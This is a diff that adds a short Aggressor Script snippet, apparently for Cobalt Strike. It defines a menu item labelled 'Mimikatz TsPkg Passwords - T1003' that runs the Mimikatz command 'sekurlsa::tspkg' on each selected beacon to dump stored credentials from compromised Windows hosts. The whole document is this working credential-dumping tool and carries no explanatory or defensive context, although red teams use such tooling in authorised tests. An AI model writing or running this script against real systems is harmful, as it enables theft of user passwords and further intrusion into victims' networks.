@@ -1,0 +1,14 @@
+item "Mimikatz TsPkg Passwords  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					tspkg($bid);
+				}
+			}
+			
+			
+			
+sub tspkg{
+
+bmimikatz($1, "sekurlsa::tspkg");
+
+}			
